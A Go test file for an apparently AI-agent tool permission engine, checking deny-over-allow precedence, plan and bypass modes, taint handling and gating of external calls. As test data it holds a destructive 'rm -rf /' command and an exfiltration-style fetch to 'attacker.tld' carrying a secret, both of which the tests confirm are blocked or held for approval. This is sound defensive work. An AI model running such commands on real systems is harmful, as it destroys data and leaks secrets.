package policy_test

import (
	"context"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/boltrope/boltrope/internal/orchestrator/domain"
	"github.com/boltrope/boltrope/internal/orchestrator/policy"
)

// newEngine builds an Engine over the supplied rules with default edit-tool
// recognition, for the table tests below.
func newEngine(t *testing.T, rules ...policy.Rule) *policy.Engine {
	t.Helper()
	eng, err := policy.NewEngine(policy.Config{RuleSet: policy.RuleSet{Rules: rules}})
	require.NoError(t, err)
	return eng
}

// TestEngine_ImplementsInterface is the compile-time assertion that the concrete
// engine satisfies the frozen contract.
func TestEngine_ImplementsInterface(_ *testing.T) {
	var _ policy.PolicyEngine = (*policy.Engine)(nil)
}

// TestEngine_DenyBeatsAllowAll covers FR-PERM-01 AC-1: a hard deny rule for a
// tool beats a catch-all allow rule. Deny wins unconditionally and no ask is
// produced.
func TestEngine_DenyBeatsAllowAll(t *testing.T) {
	eng := newEngine(t,
		policy.Rule{ID: "allow-all", Effect: policy.EffectAllow}, // catch-all allow
		policy.Rule{ID: "deny-bash", Effect: policy.EffectDeny, ToolName: "bash"},
	)
	res, err := eng.Evaluate(context.Background(), policy.Input{
		ToolName:    "bash",
		SideEffect:  domain.SideEffectMutating,
		EgressClass: domain.EgressClassNone,
		Mode:        policy.ModeDefault,
	})
	require.NoError(t, err)
	assert.Equal(t, policy.Deny, res.Decision, "deny must win over allow-all")
	assert.Equal(t, "deny-bash", res.RuleID)
	assert.NotEmpty(t, res.Reason)
}

// TestEngine_DenyBeatsBypass asserts deny wins even under bypass mode: bypass
// collapses allow/ask but can never overturn a deny (architecture §8.13).
func TestEngine_DenyBeatsBypass(t *testing.T) {
	eng := newEngine(t,
		policy.Rule{ID: "deny-bash", Effect: policy.EffectDeny, ToolName: "bash"},
	)
	res, err := eng.Evaluate(context.Background(), policy.Input{
		ToolName:   "bash",
		SideEffect: domain.SideEffectMutating,
		Mode:       policy.ModeBypass,
	})
	require.NoError(t, err)
	assert.Equal(t, policy.Deny, res.Decision)
	assert.Equal(t, "deny-bash", res.RuleID)
}

// TestEngine_AcceptEditsAutoApprovesEdit covers FR-PERM-02 AC-1 (edit side): in
// acceptEdits mode an edit tool is auto-allowed with no ask, with a mode-derived
// rule id and reason.
func TestEngine_AcceptEditsAutoApprovesEdit(t *testing.T) {
	eng := newEngine(t) // no rules; rely on the mode
	res, err := eng.Evaluate(context.Background(), policy.Input{
		ToolName:    "edit",
		SideEffect:  domain.SideEffectMutating,
		EgressClass: domain.EgressClassNone,
		Mode:        policy.ModeAcceptEdits,
	})
	require.NoError(t, err)
	assert.Equal(t, policy.Allow, res.Decision)
	assert.Equal(t, string(policy.ModeAcceptEdits), res.RuleID)
	assert.NotEmpty(t, res.Reason)
}

// TestEngine_AcceptEditsDoesNotAutoApproveBash covers FR-PERM-02 AC-1 (bash
// side): acceptEdits does not auto-approve bash; with no allow rule it falls
// through to ask.
func TestEngine_AcceptEditsDoesNotAutoApproveBash(t *testing.T) {
	eng := newEngine(t)
	res, err := eng.Evaluate(context.Background(), policy.Input{
		ToolName:    "bash",
		SideEffect:  domain.SideEffectMutating,
		EgressClass: domain.EgressClassNone,
		Mode:        policy.ModeAcceptEdits,
	})
	require.NoError(t, err)
	assert.Equal(t, policy.Ask, res.Decision, "bash is not an edit; must still ask")
}

// TestEngine_AcceptEditsDenyStillBlocks asserts a deny rule still blocks an edit
// even in acceptEdits mode (deny precedes mode).
func TestEngine_AcceptEditsDenyStillBlocks(t *testing.T) {
	eng := newEngine(t,
		policy.Rule{ID: "deny-edit", Effect: policy.EffectDeny, ToolName: "edit"},
	)
	res, err := eng.Evaluate(context.Background(), policy.Input{
		ToolName:    "edit",
		SideEffect:  domain.SideEffectMutating,
		EgressClass: domain.EgressClassNone,
		Mode:        policy.ModeAcceptEdits,
	})
	require.NoError(t, err)
	assert.Equal(t, policy.Deny, res.Decision)
	assert.Equal(t, "deny-edit", res.RuleID)
}

// TestEngine_PlanModeDeniesMutating covers FR-PERM-01 AC-2: in plan mode a
// mutating tool with no allow is held for approval (ask), with a mode-derived
// rule id and a populated reason.
func TestEngine_PlanModeHoldsMutating(t *testing.T) {
	eng := newEngine(t)
	res, err := eng.Evaluate(context.Background(), policy.Input{
		ToolName:    "edit",
		SideEffect:  domain.SideEffectMutating,
		EgressClass: domain.EgressClassNone,
		Mode:        policy.ModePlan,
	})
	require.NoError(t, err)
	assert.Equal(t, policy.Ask, res.Decision)
	assert.Equal(t, string(policy.ModePlan), res.RuleID)
	assert.NotEmpty(t, res.Reason)
}

// TestEngine_PlanModeAllowsReadOnly asserts plan mode does not hold a read-only
// tool; it falls through the normal pipeline (here: ask, since no allow rule).
func TestEngine_PlanModeAllowsReadOnly(t *testing.T) {
	eng := newEngine(t,
		policy.Rule{ID: "allow-read", Effect: policy.EffectAllow, ToolName: "read"},
	)
	res, err := eng.Evaluate(context.Background(), policy.Input{
		ToolName:    "read",
		SideEffect:  domain.SideEffectReadOnly,
		EgressClass: domain.EgressClassNone,
		Mode:        policy.ModePlan,
	})
	require.NoError(t, err)
	assert.Equal(t, policy.Allow, res.Decision, "read-only is not mutating; plan does not hold it")
	assert.Equal(t, "allow-read", res.RuleID)
}

// TestEngine_PlanModeMutatingDenyStillWins asserts a deny rule beats plan-mode
// holding too (deny precedes mode); the decision is Deny, not Ask.
func TestEngine_PlanModeMutatingDenyStillWins(t *testing.T) {
	eng := newEngine(t,
		policy.Rule{ID: "deny-edit", Effect: policy.EffectDeny, ToolName: "edit"},
	)
	res, err := eng.Evaluate(context.Background(), policy.Input{
		ToolName:   "edit",
		SideEffect: domain.SideEffectMutating,
		Mode:       policy.ModePlan,
	})
	require.NoError(t, err)
	assert.Equal(t, policy.Deny, res.Decision)
}

// TestEngine_UnmatchedFallsThroughToAsk covers the default fallthrough: a tool
// neither denied, mode-resolved, nor allowed requires approval; the bare ask
// fallthrough leaves RuleID empty but still carries a reason.
func TestEngine_UnmatchedFallsThroughToAsk(t *testing.T) {
	eng := newEngine(t,
		policy.Rule{ID: "allow-read", Effect: policy.EffectAllow, ToolName: "read"},
	)
	res, err := eng.Evaluate(context.Background(), policy.Input{
		ToolName:    "write",
		SideEffect:  domain.SideEffectMutating,
		EgressClass: domain.EgressClassNone,
		Mode:        policy.ModeDefault,
	})
	require.NoError(t, err)
	assert.Equal(t, policy.Ask, res.Decision)
	assert.Empty(t, res.RuleID, "bare ask fallthrough has no rule id")
	assert.NotEmpty(t, res.Reason)
}

// TestEngine_AllowRuleAllows asserts a matching allow rule (no deny, default
// mode) yields Allow with the matched rule id.
func TestEngine_AllowRuleAllows(t *testing.T) {
	eng := newEngine(t,
		policy.Rule{ID: "allow-read", Effect: policy.EffectAllow, ToolName: "read"},
	)
	res, err := eng.Evaluate(context.Background(), policy.Input{
		ToolName:    "read",
		SideEffect:  domain.SideEffectReadOnly,
		EgressClass: domain.EgressClassNone,
		Mode:        policy.ModeDefault,
	})
	require.NoError(t, err)
	assert.Equal(t, policy.Allow, res.Decision)
	assert.Equal(t, "allow-read", res.RuleID)
}

// TestEngine_BypassCollapsesToAllow asserts bypass (no taint, not denied)
// collapses allow/ask into allow, with a mode-derived rule id.
func TestEngine_BypassCollapsesToAllow(t *testing.T) {
	eng := newEngine(t) // no allow rule at all
	res, err := eng.Evaluate(context.Background(), policy.Input{
		ToolName:    "bash",
		SideEffect:  domain.SideEffectMutating,
		EgressClass: domain.EgressClassNone,
		Mode:        policy.ModeBypass,
	})
	require.NoError(t, err)
	assert.Equal(t, policy.Allow, res.Decision, "bypass collapses ask into allow")
	assert.Equal(t, string(policy.ModeBypass), res.RuleID)
}

// TestEngine_BypassWithTaintErrors covers FR-PERM-02 AC-2: enabling bypass while
// the session is tainted is rejected with a PolicyError (bypass is forbidden
// under untrusted content). The error is matchable with errors.Is.
func TestEngine_BypassWithTaintErrors(t *testing.T) {
	eng := newEngine(t)
	_, err := eng.Evaluate(context.Background(), policy.Input{
		ToolName:    "bash",
		SideEffect:  domain.SideEffectMutating,
		EgressClass: domain.EgressClassNone,
		Mode:        policy.ModeBypass,
		Tainted:     true,
	})
	require.Error(t, err)
	require.ErrorIs(t, err, policy.ErrBypassForbidden)
}

// TestEngine_BypassDoesNotDisableDeny re-states (alongside DenyBeatsBypass) that
// even a non-tainted bypass cannot overturn a deny: deny precedes the bypass
// collapse.
func TestEngine_BypassDoesNotDisableDeny(t *testing.T) {
	eng := newEngine(t,
		policy.Rule{ID: "deny-rm", Effect: policy.EffectDeny, ToolName: "bash", ArgMatch: "rm -rf*"},
	)
	res, err := eng.Evaluate(context.Background(), policy.Input{
		ToolName:    "bash",
		ToolArgs:    map[string]any{"command": "rm -rf /"},
		SideEffect:  domain.SideEffectMutating,
		EgressClass: domain.EgressClassNone,
		Mode:        policy.ModeBypass,
	})
	require.NoError(t, err)
	assert.Equal(t, policy.Deny, res.Decision)
	assert.Equal(t, "deny-rm", res.RuleID)
}

// TestEngine_ExternalToNonAllowlistedHostAsks covers FR-PERM-03 AC-1/AC-2: an
// external-comms tool to a non-allowlisted host is gated to ask whether or not
// the session is tainted (taint is not required for the first escalation).
func TestEngine_ExternalToNonAllowlistedHostAsks(t *testing.T) {
	for _, tainted := range []bool{false, true} {
		eng := newEngine(t) // empty allowlist → deny-by-default external
		res, err := eng.Evaluate(context.Background(), policy.Input{
			ToolName:    "webfetch",
			ToolArgs:    map[string]any{"url": "https://attacker.tld/?secret=x"},
			SideEffect:  domain.SideEffectMutating,
			EgressClass: domain.EgressClassExternal,
			Mode:        policy.ModeDefault,
			Tainted:     tainted,
		})
		require.NoError(t, err)
		assert.Equalf(t, policy.Ask, res.Decision, "external to non-allowlisted host must ask (tainted=%v)", tainted)
		assert.NotEmpty(t, res.Reason)
	}
}

// TestEngine_TaintEscalatesAllowedExternalToAsk covers FR-PERM-03: a host that an
// allow rule WOULD permit is still escalated to ask once the session is tainted.
// Escalation only tightens.
func TestEngine_TaintEscalatesAllowedExternalToAsk(t *testing.T) {
	allow := policy.Rule{ID: "allow-host", Effect: policy.EffectAllow, ToolName: "webfetch", ArgMatch: "host:example.com"}

	// Untainted: the allow rule stands.
	eng := newEngine(t, allow)
	in := policy.Input{
		ToolName:    "webfetch",
		ToolArgs:    map[string]any{"url": "https://example.com/page"},
		SideEffect:  domain.SideEffectMutating,
		EgressClass: domain.EgressClassExternal,
		Mode:        policy.ModeDefault,
	}
	res, err := eng.Evaluate(context.Background(), in)
	require.NoError(t, err)
	require.Equal(t, policy.Allow, res.Decision, "untainted allowlisted host is allowed")

	// Tainted: the same allowed external call is escalated to ask.
	in.Tainted = true
	res, err = eng.Evaluate(context.Background(), in)
	require.NoError(t, err)
	assert.Equal(t, policy.Ask, res.Decision, "taint escalates an otherwise-allowed external call to ask")
	assert.NotEmpty(t, res.Reason)
}

// TestEngine_ResultToPersistedRoundTrip asserts the Result decision maps to the
// domain's persisted vocabulary so the loop can record a PermissionDecided.
func TestEngine_ResultToPersistedRoundTrip(t *testing.T) {
	eng := newEngine(t,
		policy.Rule{ID: "deny-bash", Effect: policy.EffectDeny, ToolName: "bash"},
	)
	res, err := eng.Evaluate(context.Background(), policy.Input{ToolName: "bash", Mode: policy.ModeDefault})
	require.NoError(t, err)
	assert.Equal(t, domain.PermissionDeny, res.Decision.ToPersisted())
}

// TestEngine_ArgMatchScopesDeny asserts a deny rule with an ArgMatch only fires
// when the argument predicate matches; a non-matching command is not denied by
// that rule.
func TestEngine_ArgMatchScopesDeny(t *testing.T) {
	eng := newEngine(t,
		policy.Rule{ID: "deny-rm", Effect: policy.EffectDeny, ToolName: "bash", ArgMatch: "rm -rf*"},
		policy.Rule{ID: "allow-bash", Effect: policy.EffectAllow, ToolName: "bash"},
	)

	// Matches the deny predicate.
	res, err := eng.Evaluate(context.Background(), policy.Input{
		ToolName:   "bash",
		ToolArgs:   map[string]any{"command": "rm -rf /"},
		SideEffect: domain.SideEffectMutating,
		Mode:       policy.ModeDefault,
	})
	require.NoError(t, err)
	assert.Equal(t, policy.Deny, res.Decision)

	// Does not match the deny predicate → the allow rule applies.
	res, err = eng.Evaluate(context.Background(), policy.Input{
		ToolName:   "bash",
		ToolArgs:   map[string]any{"command": "ls -la"},
		SideEffect: domain.SideEffectMutating,
		Mode:       policy.ModeDefault,
	})
	require.NoError(t, err)
	assert.Equal(t, policy.Allow, res.Decision)
	assert.Equal(t, "allow-bash", res.RuleID)
}

// TestEngine_InvalidRuleEffectRejected asserts NewEngine validates rule effects
// at construction so a misconfigured rule cannot silently no-op at evaluate time.
func TestEngine_InvalidRuleEffectRejected(t *testing.T) {
	_, err := policy.NewEngine(policy.Config{RuleSet: policy.RuleSet{Rules: []policy.Rule{
		{ID: "bad", Effect: "maybe", ToolName: "bash"},
	}}})
	require.Error(t, err)
}

// TestEngine_ConcurrentEvaluateSafe exercises the documented concurrency safety:
// many goroutines evaluating against a shared engine must not race and must agree.
func TestEngine_ConcurrentEvaluateSafe(t *testing.T) {
	eng := newEngine(t,
		policy.Rule{ID: "deny-bash", Effect: policy.EffectDeny, ToolName: "bash"},
	)
	const n = 64
	done := make(chan policy.Decision, n)
	for range n {
		go func() {
			res, err := eng.Evaluate(context.Background(), policy.Input{ToolName: "bash", Mode: policy.ModeDefault})
			if err != nil {
				done <- policy.Ask
				return
			}
			done <- res.Decision
		}()
	}
	for range n {
		assert.Equal(t, policy.Deny, <-done)
	}
}
